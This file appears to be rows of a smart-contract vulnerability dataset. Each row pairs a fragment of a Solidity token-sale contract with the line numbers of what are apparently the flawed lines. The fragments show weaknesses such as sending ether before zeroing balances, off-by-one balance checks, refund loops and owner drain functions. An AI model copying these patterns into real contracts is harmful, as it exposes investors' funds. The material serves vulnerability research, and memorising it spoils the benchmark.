    wallet.transfer(address(this).balance);
  }
  function transferSoldTokens(address _beneficiary, uint256 _tokenAmount) public onlyOwner returns (bool) {
    uint8 stageIndex = _getStageIndex();
    require(stageIndex > 0);
    require(stageIndex <= 8);
    if (stageIndex == 1 || stageIndex == 2) {
      round1Sold = round1Sold.add(_tokenAmount);
      require(round1Sold <= round1Cap);
    } else if (stageIndex == 3 || stageIndex == 4) {
      round2Sold = round2Sold.add(_tokenAmount);
      require(round2Sold <= round2Cap);
    } else if (stageIndex == 5 || stageIndex == 6) {
      round3Sold = round3Sold.add(_tokenAmount);
      require(round3Sold <= round3Cap);
    } else if (stageIndex == 7) {
      round4Sold = round4Sold.add(_tokenAmount);
      require(round4Sold <= round4Cap);
    }
    emit ExternalTokenPurchase(
      _beneficiary,
      _beneficiary,
      _tokenAmount
    );
    require(token.transfer(_beneficiary, _tokenAmount));
    return true;
  }
}",[64]
"    rate = 1000000;
    // address where funds are collected
    wallet = 0x7472106A07EbAB5a202e195c0dC22776778b44E6;
  }
  function setStartICO(uint _startICO) public onlyOwner{
    startICO = _startICO;
    endICO = startICO + period * 1 days;
    endICO14 = endICO + 14 * 1 days;
  }
  function setPeriod(uint _period) public onlyOwner{
    period = _period;
    endICO = startICO + period * 1 days;
    endICO14 = endICO + 14 * 1 days;
  }
  function setRate(uint _rate) public  onlyOwner{
    rate = _rate;
  }
  function createTokenContract() internal returns (Wolf) {
    return new Wolf();
  }
  // fallback function can be used to Procure tokens
  function () external payable {
    procureTokens(msg.sender);
  }
  // low level token Pledge function
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    require(beneficiary != address(0));
    //minimum/maximum amount in ETH
    require(weiAmount >= minNumbPerSubscr && weiAmount <= maxNumbPerSubscr);
    if (now >= startICO && now <= endICO && totalICO < hardCap){
      tokens = weiAmount.mul(rate);
      if (hardCap.sub(totalICO) < tokens){
        tokens = hardCap.sub(totalICO);
        weiAmount = tokens.div(rate);
        backAmount = msg.value.sub(weiAmount);
      }
      totalICO = totalICO.add(tokens);
    }
    require(tokens > 0);
    token.mint(beneficiary, tokens);
    balancesSoftCap[beneficiary] = balancesSoftCap[beneficiary].add(weiAmount);
    uint256 dateEndRefund = now + 14 * 1 days;
    paymentCounter[beneficiary] = paymentCounter[beneficiary] + 1;
    payments[beneficiary][paymentCounter[beneficiary]] = BuyInfo(weiAmount, tokens, dateEndRefund);
    if (backAmount > 0){
      msg.sender.transfer(backAmount);
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }
  function refund() public{
    require(address(this).balance < softcap && now > endICO);
    require(balancesSoftCap[msg.sender] > 0);
    uint value = balancesSoftCap[msg.sender];
    balancesSoftCap[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function revoke(uint _id) public{
    require(now <= payments[msg.sender][_id].dateEndRefund);
    require(payments[msg.sender][_id].summEth > 0);
    require(payments[msg.sender][_id].summToken > 0);
    uint value = payments[msg.sender][_id].summEth;
    uint valueToken = payments[msg.sender][_id].summToken;
    balancesSoftCap[msg.sender] = balancesSoftCap[msg.sender].sub(value);
    payments[msg.sender][_id].summEth = 0;
    payments[msg.sender][_id].summToken = 0;
    msg.sender.transfer(value);
    token.burn(msg.sender, valueToken);
   }
  function transferToMultisig() public onlyOwner {
    require(address(this).balance >= softcap && now > endICO14);
      wallet.transfer(address(this).balance);
  }
}","[54, 74]"
"    event Purchase(address indexed holder, uint256 tokenAmount, uint256 etherAmount);
    event Sell(address indexed holder, uint256 tokenAmount, uint256 etherAmount);
    event NewRate(uint256 rate);
    event NextStep(uint8 step);
    event CrowdsaleClose();
    function Crowdsale() public {
        token = new Token();
        steps.push(Step(1 ether / 1000, 1000000 * 1 ether, 2 ether, 0, 0, true, false));
        steps.push(Step(1 ether / 1000, 1500000 * 1 ether, 1 ether, 0, 0, true, false));
        steps.push(Step(1 ether / 1000, 3000000 * 1 ether, 0.5 ether, 0, 0, true, false));
        steps.push(Step(1 ether / 1000, 9000000 * 1 ether, 0.25 ether, 0, 0, true, false));
        steps.push(Step(1 ether / 1000, 35000000 * 1 ether, 0.1 ether, 0, 0, true, false));
        steps.push(Step(1 ether / 1000, 20500000 * 1 ether, 0.01 ether, 0, 0, true, true));
    }
    function() payable public {
        purchase();
    }
    function tokenFallback(address _from, uint256 _value, bytes _data) external {
        sell(_value);
    }
    function setTokenRate(uint _value) onlyOwner public {
        require(!crowdsaleClosed);
        steps[currentStep].priceTokenWei = 1 ether / _value;
        NewRate(steps[currentStep].priceTokenWei);
    }
    function purchase() whenNotPaused payable public {
        require(!crowdsaleClosed);
        Step memory step = steps[currentStep];
        require(msg.value >= step.minInvestEth);
        require(step.tokensSold < step.tokensForSale);
        uint sum = msg.value;
        uint amount = sum.mul(1 ether).div(step.priceTokenWei);
        uint retSum = 0;
        if(step.tokensSold.add(amount) > step.tokensForSale) {
            uint retAmount = step.tokensSold.add(amount).sub(step.tokensForSale);
            retSum = retAmount.mul(step.priceTokenWei).div(1 ether);
            amount = amount.sub(retAmount);
            sum = sum.sub(retSum);
        }
        steps[currentStep].tokensSold = step.tokensSold.add(amount);
        steps[currentStep].collectedWei = step.collectedWei.add(sum);
        if(currentStep == 0) {
            canSell[msg.sender] = canSell[msg.sender].add(amount);
        }
        if(step.transferBalance) {
            uint p1 = sum.div(200);
            (0x27c1D3ECD24C13C6b5362dA1136215fa929de010).transfer(p1.mul(3));
            (0x8C8d80effb2c5C1E4D857e286822E0E641cA3836).transfer(p1.mul(3));
            beneficiary.transfer(sum.sub(p1.mul(6)));
        }
        token.mint(msg.sender, amount);
        if(retSum > 0) {
            msg.sender.transfer(retSum);
        }
        Purchase(msg.sender, amount, sum);
    }
    function sell(uint256 _value) whenNotPaused public {
        require(!crowdsaleClosed);
        require(canSell[msg.sender] >= _value);
        require(token.balanceOf(msg.sender) >= _value);
        Step memory step = steps[currentStep];
        require(step.sale);
        canSell[msg.sender] = canSell[msg.sender].sub(_value);
        token.call('transfer', beneficiary, _value);
        uint sum = _value.mul(step.priceTokenWei).div(1 ether);
        msg.sender.transfer(sum);
        Sell(msg.sender, _value, sum);
    }
    function nextStep(uint _value) onlyOwner public {
        require(!crowdsaleClosed);
        require(steps.length - 1 > currentStep);
        currentStep += 1;
        setTokenRate(_value);
        NextStep(currentStep);
    }
    function closeCrowdsale() onlyOwner public {
        require(!crowdsaleClosed);
        beneficiary.transfer(this.balance);
        token.mint(beneficiary, token.cap().sub(token.totalSupply()));
        token.transferOwnership(beneficiary);
        crowdsaleClosed = true;
        CrowdsaleClose();
    }
}",[64]
"  function totalSupply() constant returns (uint256 totalSupply);
  function balanceOf(address _owner) constant returns (uint256 balance);
  function transfer(address _to, uint256 _value) returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
  function approve(address _spender, uint256 _value) returns (bool success);
  function allowance(address _owner, address _spender) constant returns (uint256 remaining);
  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);
 }
contract GMPToken is Ownable, ERC20Interface {
  /* Public variables of the token */
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  /* This creates an array with all balances */
  mapping (address => uint256) public balances;
  mapping (address => mapping (address => uint256)) public allowed;
  /* Constuctor: Initializes contract with initial supply tokens to the creator of the contract */
  function GMPToken(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
      ) {
      balances[msg.sender] = initialSupply;              // Give the creator all initial tokens
      totalSupply = initialSupply;                        // Update total supply
      name = tokenName;                                   // Set the name for display purposes
      symbol = tokenSymbol;                               // Set the symbol for display purposes
      decimals = decimalUnits;                            // Amount of decimals for display purposes
  }
  /* Implementation of ERC20Interface */
  function totalSupply() constant returns (uint256 totalSupply) { return totalSupply; }
  function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; }
  /* Internal transfer, only can be called by this contract */
  function _transfer(address _from, address _to, uint _amount) internal {
      require (_to != 0x0);                               // Prevent transfer to 0x0 address. Use burn() instead
      require (balances[_from] > _amount);                // Check if the sender has enough
      require (balances[_to] + _amount > balances[_to]); // Check for overflows
      balances[_from] -= _amount;                         // Subtract from the sender
      balances[_to] += _amount;                            // Add the same to the recipient
      Transfer(_from, _to, _amount);
  }
  function transfer(address _to, uint256 _amount) returns (bool success) {
    _transfer(msg.sender, _to, _amount);
    return true;
  }
  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
    require (_value < allowed[_from][msg.sender]);     // Check allowance
    allowed[_from][msg.sender] -= _value;
    _transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _amount) returns (bool success) {
    allowed[msg.sender][_spender] = _amount;
    Approval(msg.sender, _spender, _amount);
    return true;
  }
  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
  function mintToken(uint256 mintedAmount) onlyOwner {
      balances[Ownable.owner] += mintedAmount;
      totalSupply += mintedAmount;
      Transfer(0, Ownable.owner, mintedAmount);
  }
}
contract Crowdsale is Ownable {
  using SafeMath for uint256;
  // The token being sold
  GMPToken public token;
  // Flag setting that investments are allowed (both inclusive)
  bool public saleIsActive;
  // address where funds are collected
  address public wallet;
  // Price for 1 token in wei. i.e. 562218890554723
  uint256 public rate;
  // amount of raised money in wei
  uint256 public weiRaised;
  /**
   * event for token purchase logging
   * @param purchaser who paid for the tokens
   * @param beneficiary who got the tokens
   * @param value weis paid for purchase
   * @param amount amount of tokens purchased
   */
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);
  /* -----------   A D M I N        F U N C T I O N S    ----------- */
  function Crowdsale(uint256 initialRate, address targetWallet, uint256 initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol) {
    //Checks
    require(initialRate > 0);
    require(targetWallet != 0x0);
    //Init
    token = new GMPToken(initialSupply, tokenName, decimalUnits, tokenSymbol);
    rate = initialRate;
    wallet = targetWallet;
    saleIsActive = true;
  }
  function close() onlyOwner {
    selfdestruct(owner);
  }
  //Transfer token to
  function transferToAddress(address targetWallet, uint256 tokenAmount) onlyOwner {
    token.transfer(targetWallet, tokenAmount);
  }
  //Setters
  function enableSale() onlyOwner {
    saleIsActive = true;
  }
  function disableSale() onlyOwner {
    saleIsActive = false;
  }
  function setRate(uint256 newRate)  onlyOwner {
    rate = newRate;
  }
  //Mint new tokens
  function mintToken(uint256 mintedAmount) onlyOwner {
    token.mintToken(mintedAmount);
  }
  /* -----------   P U B L I C      C A L L B A C K       F U N C T I O N     ----------- */
  function () payable {
    require(msg.sender != 0x0);
    require(saleIsActive);
    require(msg.value > rate);
    uint256 weiAmount = msg.value;
    //Update total wei counter
    weiRaised = weiRaised.add(weiAmount);
    //Calc number of tokents",[64]
"      if(icoStart + 3 weeks > _time){
        return 10;
      }
    }
    return 0;
  }
  event OnSuccessfullyBuy(address indexed _address, uint indexed _etherValue, bool indexed isBought, uint _tokenValue);
  //fallback function (when investor send ether to contract)
  function() public payable{
    require(isPreIco(now) || isIco(now));
    require(buy(msg.sender,msg.value, now)); //redirect to func buy
  }
  //function buy Tokens
  function buy(address _address, uint _value, uint _time) internal returns (bool){
    uint tokensToSend = etherToTokens(_value,_time);
    if (isPreIco(_time)){
      require (tokensToSend >= preIcoMinInvest);
      require (preIcoTokensSold.add(tokensToSend) <= preIcoMaxCap);
      token.sendCrowdsaleTokens(_address,tokensToSend);
      preIcoTokensSold = preIcoTokensSold.add(tokensToSend);
      tokensSold = tokensSold.add(tokensToSend);
      distributeEther();
    }else{
      require (tokensToSend >= icoMinInvest);
      token.sendCrowdsaleTokens(_address,tokensToSend);
      contributorBalances[_address] = contributorBalances[_address].add(_value);
      tokensSold = tokensSold.add(tokensToSend);
      if (tokensSold >= minCap){
        distributeEther();
      }
    }
    emit OnSuccessfullyBuy(_address,_value,true, tokensToSend);
    ethCollected = ethCollected.add(_value);
    return true;
  }
  address public distributionAddress = 0x769EDcf3756A3Fd4D52B739E06dF060b7379C4Ef;
  function distributeEther() internal {
    distributionAddress.transfer(address(this).balance);
  }
  event ManualTokensSended(address indexed _address, uint indexed _value, bool );
  function manualSendTokens (address _address, uint _tokens) public onlyTechSupport {
    token.sendCrowdsaleTokens(_address, _tokens);
    tokensSold = tokensSold.add(_tokens);
    emit OnSuccessfullyBuy(_address,0,false,_tokens);
  }
  function manualSendEther (address _address, uint _value) public onlyTechSupport {
    uint tokensToSend = etherToTokens(_value, 0);
    tokensSold = tokensSold.add(tokensToSend);
    ethCollected = ethCollected.add(_value);
    token.sendCrowdsaleTokens(_address, tokensToSend);
    emit OnSuccessfullyBuy(_address,_value,false, tokensToSend);
  }
  //convert ether to tokens (without decimals)
  function etherToTokens(uint _value, uint _time) public view returns(uint res) {
    if(_time == 0){
        _time = now;
    }
    res = _value.mul((uint)(10).pow(decimals))/tokenPrice;
    uint bonus = timeBasedBonus(_time);
    res = res.add(res.mul(bonus)/100);
  }
  event Refund(address indexed contributor, uint ethValue);
  function refund () public {
    require (now > icoFinish && tokensSold < minCap);
    require (contributorBalances[msg.sender] != 0);
    msg.sender.transfer(contributorBalances[msg.sender]);
    emit Refund(msg.sender, contributorBalances[msg.sender]);
    contributorBalances[msg.sender] = 0;
  }
  function endIco () public onlyTechSupport {
    require(now > icoFinish + 5 days);
    token.endIco();
  }
}",[64]
"  }
  // low level token Pledge function
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    require(beneficiary != address(0));
    //minimum amount in ETH
    require(weiAmount >= minQuanValues);
    //maximum amount in ETH
    require(weiAmount.add(balances[msg.sender]) <= maxQuanValues);
    //hard cap
    address _this = this;
    require(hardcap > _this.balance);
    //Pre-sale
    if (now >= startPreSale && now < endPreSale && totalPreSale < maxPreSale){
      tokens = weiAmount.mul(ratePreSale);
	  if (maxPreSale.sub(totalPreSale) <= tokens){
	    endPreSale = now;
	    startIco = now;
	    endIco = startIco + 6 * 7 * 1 days;
	  }
      if (maxPreSale.sub(totalPreSale) < tokens){
        tokens = maxPreSale.sub(totalPreSale);
        weiAmount = tokens.div(ratePreSale);
        backAmount = msg.value.sub(weiAmount);
      }
      totalPreSale = totalPreSale.add(tokens);
    }
    //ico
    if (now >= startIco && now < endIco && totalIco < maxIco){
      tokens = weiAmount.mul(rateIco);
      if (maxIco.sub(totalIco) < tokens){
        tokens = maxIco.sub(totalIco);
        weiAmount = tokens.div(rateIco);
        backAmount = msg.value.sub(weiAmount);
      }
      totalIco = totalIco.add(tokens);
    }
    require(tokens > 0);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    balancesToken[msg.sender] = balancesToken[msg.sender].add(tokens);
    if (backAmount > 0){
      msg.sender.transfer(backAmount);
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }
  function getToken() public{
    address _this = this;
    require(_this.balance >= softcap && now > endIco);
    uint value = balancesToken[msg.sender];
    balancesToken[msg.sender] = 0;
    token.transfer(msg.sender, value);
  }
  function refund() public{
    address _this = this;
    require(_this.balance < softcap && now > endIco);
    require(balances[msg.sender] > 0);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function transferTokenToMultisig(address _address) public onlyOwner {
    address _this = this;
    require(_this.balance >= softcap && now > endIco);
    token.transfer(_address, token.balanceOf(_this));
  }
  function transferEthToMultisig() public onlyOwner {
    address _this = this;
    require(_this.balance >= softcap && now > endIco);
    wallet.transfer(_this.balance);
  }
}","[57, 71]"
"      bonus = 10;
    }
    if (now >= startIcoPreICO.add(2 * 7 * 1 days) && now < startIcoPreICO.add(4 * 7 * 1 days)){
      bonus = 8;
    }
    if (now >= startIcoPreICO.add(4 * 7 * 1 days) && now < startIcoPreICO.add(6 * 7 * 1 days)){
      bonus = 6;
    }
    if (now >= startIcoPreICO.add(6 * 7 * 1 days) && now < startIcoPreICO.add(8 * 7 * 1 days)){
      bonus = 4;
    }
    if (now >= startIcoPreICO.add(8 * 7 * 1 days) && now < startIcoPreICO.add(10 * 7 * 1 days)){
      bonus = 2;
    }
    return rateICO + rateICO.mul(bonus).div(100);
  }
  // low level token Pledge function
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    uint256 rate;
    uint hardCap;
    require(beneficiary != address(0));
    rate = getRateIcoWithBonus();
    //icoPreICO
    hardCap = hardcapPreICO;
    if (now >= startIcoPreICO && now < endIcoPreICO && totalSoldTokens < hardCap){
	  require(weiAmount >= minPurchasePreICO);
      tokens = weiAmount.mul(rate);
      if (hardCap.sub(totalSoldTokens) < tokens){
        tokens = hardCap.sub(totalSoldTokens);
        weiAmount = tokens.div(rate);
        backAmount = msg.value.sub(weiAmount);
      }
    }
    //icoMainSale
    hardCap = hardcapMainSale.add(hardcapPreICO);
    if (now >= startIcoMainSale  && now < endIcoMainSale  && totalSoldTokens < hardCap){
      tokens = weiAmount.mul(rate);
      if (hardCap.sub(totalSoldTokens) < tokens){
        tokens = hardCap.sub(totalSoldTokens);
        weiAmount = tokens.div(rate);
        backAmount = msg.value.sub(weiAmount);
      }
    }
    require(tokens > 0);
    totalSoldTokens = totalSoldTokens.add(tokens);
    balances[msg.sender] = balances[msg.sender].add(weiAmount);
    token.mint(msg.sender, tokens);
	unconfirmedSum = unconfirmedSum.add(tokens);
	unconfirmedSumAddr[msg.sender] = unconfirmedSumAddr[msg.sender].add(tokens);
	token.SetPermissionsList(beneficiary, 1);
    if (backAmount > 0){
      msg.sender.transfer(backAmount);
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }
  function refund() public{
    require(totalSoldTokens.sub(unconfirmedSum) < softcap && now > endIcoMainSale);
    require(balances[msg.sender] > 0);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function transferEthToMultisig() public onlyOwner {
    address _this = this;
    require(totalSoldTokens.sub(unconfirmedSum) >= softcap && now > endIcoMainSale);
    wallet.transfer(_this.balance);
  }
  function refundUnconfirmed() public{
    require(now > endIcoMainSale);
    require(balances[msg.sender] > 0);
    require(token.GetPermissionsList(msg.sender) == 1);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
   // token.burn(msg.sender, token.balanceOf(msg.sender));
    uint uvalue = unconfirmedSumAddr[msg.sender];
    unconfirmedSumAddr[msg.sender] = 0;
    token.burn(msg.sender, uvalue );
   // totalICO = totalICO.sub(token.balanceOf(msg.sender));
  }
  function SetPermissionsList(address _address, uint8 _sign) public onlyOwner{
      uint8 sign;
      sign = token.GetPermissionsList(_address);
      token.SetPermissionsList(_address, _sign);
      if (_sign == 0){
          if (sign != _sign){
			unconfirmedSum = unconfirmedSum.sub(unconfirmedSumAddr[_address]);
			unconfirmedSumAddr[_address] = 0;
          }
      }
   }
   function GetPermissionsList(address _address) public constant onlyOwner returns(uint8){
     return token.GetPermissionsList(_address);
   }
   function pause() onlyOwner public {
     token.pause();
   }
   function unpause() onlyOwner public {
     token.unpause();
   }
}","[60, 69]"
"        }
        else {
            super.transfer(to, value);
        }
    }
    function transferFrom(address from, address to, uint256 value) public returns (bool){
        if(isinvestor[from]){
            //sale has ended
            require(stop);
            super.transferFrom(from, to, value);
        }
         else if(isTeamOrAdvisorsOrFounder[from]){
            //180 days = 6 months
            require(now > saleEndDate.add(180 days));
            super.transferFrom(from,to, value);
        }
        else {
           super.transferFrom(from, to, value);
        }
    }
    //function to buy tokens
    function buyTokens (address beneficiary) public payable respectTimeFrame {
        // only approved buyers can call this function
        require(whitelist[beneficiary]);
        // No contributions below the minimum
        require(msg.value >= getMinContributionInWei());
        uint256 tokenToTransfer = getTokens(msg.value);
        // Check if the CrowdSale hard cap will be exceeded
        require(tokensSold.add(tokenToTransfer) <= hardCap);
        tokensSold = tokensSold.add(tokenToTransfer);
        //initializing structure for the address of the beneficiary
        Investor storage investorStruct = investors[beneficiary];
        //Update investor's balance
        investorStruct.tokenSent = investorStruct.tokenSent.add(tokenToTransfer);
        investorStruct.weiReceived = investorStruct.weiReceived.add(msg.value);
        //If it is a new investor, then create a new id
        if(investorStruct.investorID == 0){
            countTotalInvestors++;
            investorStruct.investorID = countTotalInvestors;
            investorList[countTotalInvestors] = beneficiary;
        }
        isinvestor[beneficiary] = true;
        ETHCollector.transfer(msg.value);
        weiCollected = weiCollected.add(msg.value);
        balances[owner] = balances[owner].sub(tokenToTransfer);
        balances[beneficiary] = balances[beneficiary].add(tokenToTransfer);
        emit TokenSupplied(beneficiary, tokenToTransfer, msg.value);
    }
    /**
    * @dev payable function to accept ether.
    *
    */
    function () external payable  {
        buyTokens(msg.sender);
    }
    /*
    * Refund the investors in case target of crowdsale not achieved
    */
    function refund() public onlyOwner {
        assert(refundStatus);
        uint256 batchSize = countInvestorsRefunded.add(50) < countTotalInvestors ? countInvestorsRefunded.add(50): countTotalInvestors;
        for(uint256 i = countInvestorsRefunded.add(1); i <= batchSize; i++){
            address investorAddress = investorList[i];
            Investor storage investorStruct = investors[investorAddress];
            //return everything
            investorAddress.transfer(investorStruct.weiReceived);
            //burn investor tokens and total supply isTeamOrAdvisorsOrFounder
            burn(investorAddress, investorStruct.tokenSent);
            //set everything to zero after transfer successful
            investorStruct.weiReceived = 0;
            investorStruct.tokenSent = 0;
        }
        //Update the number of investors that have recieved refund
        countInvestorsRefunded = batchSize;
    }
    /*
    * Failsafe drain
    */
    function drain() public onlyOwner {
        ETHCollector.transfer(address(this).balance);
    }
    /*
    * Function to add Ether in the contract
    */
    function fundContractForRefund()public payable{
    }
    /**
    *
    *getter functions
    *
    *
    */
    //function to return the number of tokens sent to investor
    function getTokens(uint256 weiReceived) internal view returns(uint256){
        uint256 tokens;
        //Token Sale Stage 1 = Dates Start 10/15/18 End 10/31/18 35% discount
        if(now >= saleStartDate && now <= saleStartDate.add(10 days)){
            tokens = getTokensForWeiReceived(weiReceived);
            tokens = tokens.mul(100 + 60) / 100;
        //Token Sale Stage 2 = Dates Start 11/1/18 End 11/15/18 20% discount
        }else if (now > saleStartDate.add(10 days) && now <= saleStartDate.add(25 days)){
            tokens = getTokensForWeiReceived(weiReceived);
            tokens = tokens.mul(100 + 50) / 100;
        //Token Sale Stage 3 = Dates Start 11/16/18 End 11/30/18 No discount
        }else if (now > saleStartDate.add(25 days)  && now <= saleEndDate){
            tokens = getTokensForWeiReceived(weiReceived);
            tokens = tokens.mul(100 + 30) / 100;
        }
        return tokens;
    }
    //function to get tokens number for eth send
    function getTokensForWeiReceived(uint256 _weiAmount) internal view returns (uint256) {
        return _weiAmount.mul(ETH_USD).div(tokenCost);
    }
    //function to check softcap reached or not
    function softCapReached() view public returns(bool) {
        return tokensSold >= softCap;
    }
    //getSaleStage will return current sale stage
    function getSaleStage() view public returns(uint8){
        if(now >= saleStartDate && now <= saleStartDate.add(10 days)){
            return 1;
        }else if(now > saleStartDate.add(10 days) && now <= saleStartDate.add(25 days)){
            return 2;
        }else if (now > saleStartDate.add(25 days)  && now <= saleEndDate){
            return 3;
        }
    }","[62, 66]"
"  // fallback function can be used to Procure tokens
  function () external payable {
    procureTokens(msg.sender);
  }
  function createTokenContract() internal returns (MahalaCoin) {
    return new MahalaCoin();
  }
  // low level token Pledge function
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    require(beneficiary != address(0));
    //minimum amount in ETH
    require(weiAmount >= minQuanValues);
    //maximum amount in ETH
    require(weiAmount.add(balances[msg.sender]) <= maxQuanValues);
    //hard cap
    address _this = this;
    require(hardcap > _this.balance);
    //Pre-sale
    if (now >= startPreSale && now < endPreSale && totalPreSale < maxPreSale){
      tokens = weiAmount.mul(ratePreSale);
	  if (maxPreSale.sub(totalPreSale) <= tokens){
	    endPreSale = now;
	    startIco = now;
	    endIco = startIco + 40 * 1 days;
	  }
      if (maxPreSale.sub(totalPreSale) < tokens){
        tokens = maxPreSale.sub(totalPreSale);
        weiAmount = tokens.div(ratePreSale);
        backAmount = msg.value.sub(weiAmount);
      }
      totalPreSale = totalPreSale.add(tokens);
    }
    //ico
    if (now >= startIco && now < endIco && totalIco < maxIco){
      tokens = weiAmount.mul(rateIco);
      if (maxIco.sub(totalIco) < tokens){
        tokens = maxIco.sub(totalIco);
        weiAmount = tokens.div(rateIco);
        backAmount = msg.value.sub(weiAmount);
      }
      totalIco = totalIco.add(tokens);
    }
    require(tokens > 0);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    token.transfer(msg.sender, tokens);
   // balancesToken[msg.sender] = balancesToken[msg.sender].add(tokens);
    if (backAmount > 0){
      msg.sender.transfer(backAmount);
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }
  function refund() public{
    address _this = this;
    require(_this.balance < softcap && now > endIco);
    require(balances[msg.sender] > 0);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function transferTokenToMultisig(address _address) public onlyOwner {
    address _this = this;
    require(_this.balance < softcap && now > endIco);
    token.transfer(_address, token.balanceOf(_this));
  }
  function transferEthToMultisig() public onlyOwner {
    address _this = this;
    require(_this.balance >= softcap && now > endIco);
    wallet.transfer(_this.balance);
    token.setFrozenAccountICO(false);
  }
    /// @notice `freeze? Prevent | Allow` `target` from sending & receiving tokens
    /// @param target Address to be frozen
    /// @param freeze either to freeze it or not
  function freezeAccount(address target, bool freeze) onlyOwner public {
    token.freezeAccount(target, freeze);
  }
    /// @notice Create `mintedAmount` tokens and send it to `target`
    /// @param target Address to receive the tokens
    /// @param mintedAmount the amount of tokens it will receive
  function mintToken(address target, uint256 mintedAmount) onlyOwner public {
    token.mint(target, mintedAmount);
    }
}","[57, 71]"
"        if (backer.weiReceived == 0)
            backersIndex.push(_backer);
        backer.tokensToSend += tokensToSend; // save contributor's total tokens sent
        backer.weiReceived = backer.weiReceived.add(msg.value);  // save contributor's total ether contributed
        if (Step.FundingPublicSale == currentStep) { // Update the total Ether received and tokens sent during public sale
            ethReceivedMain = ethReceivedMain.add(msg.value);
            tokensSentMain += tokensToSend;
        }else {                                                 // Update the total Ether recived and tokens sent during presale
            ethReceivedPresale = ethReceivedPresale.add(msg.value);
            tokensSentPresale += tokensToSend;
        }
        totalTokensSent += tokensToSend;     // update the total amount of tokens sent
        multisig.transfer(address(this).balance);   // transfer funds to multisignature wallet
        require(token.transfer(_backer, tokensToSend));   // Transfer tokens
        emit ReceivedETH(_backer, msg.value, tokensToSend); // Register event
        return true;
    }
    // @notice determine if purchase is valid and return proper number of tokens
    // @return tokensToSend {uint} proper number of tokens based on the timline
    function determinePurchase() internal view  returns (uint) {
        require(msg.value >= minInvestETH);   // ensure that min contributions amount is met
        uint tokensToSend = msg.value.mul(1e8) / tokenPriceWei;   //1e8 ensures that token gets 8 decimal values
        if (Step.FundingPublicSale == currentStep) {  // calculate price of token in public sale
            require(totalTokensSent + tokensToSend + priorTokensSent <= maxCap); // Ensure that max cap hasn't been reached
        }else {
            tokensToSend += (tokensToSend * 50) / 100;
            require(totalTokensSent + tokensToSend <= presaleCap); // Ensure that max cap hasn't been reached for presale
        }
        return tokensToSend;
    }
    // @notice This function will finalize the sale.
    // It will only execute if predetermined sale time passed or all tokens are sold.
    // it will fail if minimum cap is not reached
    function finalize() external onlyOwner() {
        require(!crowdsaleClosed);
        // purchasing precise number of tokens might be impractical, thus subtract 1000
        // tokens so finalization is possible near the end
        require(block.number >= endBlock || totalTokensSent + priorTokensSent >= maxCap - 1000);
        crowdsaleClosed = true;
        require(token.transfer(team, token.balanceOf(this))); // transfer all remaining tokens to team address
        token.unlock();
    }
    // @notice Fail-safe drain
    function drain() external onlyOwner() {
        multisig.transfer(address(this).balance);
    }
    // @notice Fail-safe token transfer
    function tokenDrain() external onlyOwner() {
        if (block.number > endBlock) {
            require(token.transfer(multisig, token.balanceOf(this)));
        }
    }
    // @notice it will allow contributors to get refund in case campaign failed
    // @return {bool} true if successful
    function refund() external whenNotPaused() returns (bool) {
        require(currentStep == Step.Refunding);
        Backer storage backer = backers[msg.sender];
        require(backer.weiReceived > 0);  // ensure that user has sent contribution
        require(!backer.refunded);        // ensure that user hasn't been refunded yet
        backer.refunded = true;  // save refund status to true
        refundCount++;
        totalRefunded = totalRefunded + backer.weiReceived;
        require(token.transfer(msg.sender, backer.tokensToSend)); // return allocated tokens
        msg.sender.transfer(backer.weiReceived);  // send back the contribution
        emit RefundETH(msg.sender, backer.weiReceived);
        return true;
    }
}
contract ERC20 {
    uint public totalSupply;
    function balanceOf(address who) public view returns(uint);
    function allowance(address owner, address spender) public view returns(uint);
    function transfer(address to, uint value) public returns(bool ok);
    function transferFrom(address from, address to, uint value) public returns(bool ok);
    function approve(address spender, uint value) public returns(bool ok);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
// The token
contract Token is ERC20, Ownable {
    using SafeMath for uint;
    // Public variables of the token
    string public name;
    string public symbol;
    uint8 public decimals; // How many decimals to show.
    string public version = ""v0.1"";
    uint public totalSupply;
    bool public locked;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    address public crowdSaleAddress;
    // Lock transfer for contributors during the ICO
    modifier onlyUnlocked() {
        if (msg.sender != crowdSaleAddress && msg.sender != owner && locked)
            revert();
        _;
    }
    modifier onlyAuthorized() {
        if (msg.sender != owner && msg.sender != crowdSaleAddress)
            revert();
        _;
    }
    // @notice The Token contract
    function Token(address _crowdsaleAddress) public {
        require(_crowdsaleAddress != address(0));
        locked = true; // Lock the transfer of tokens during the crowdsale
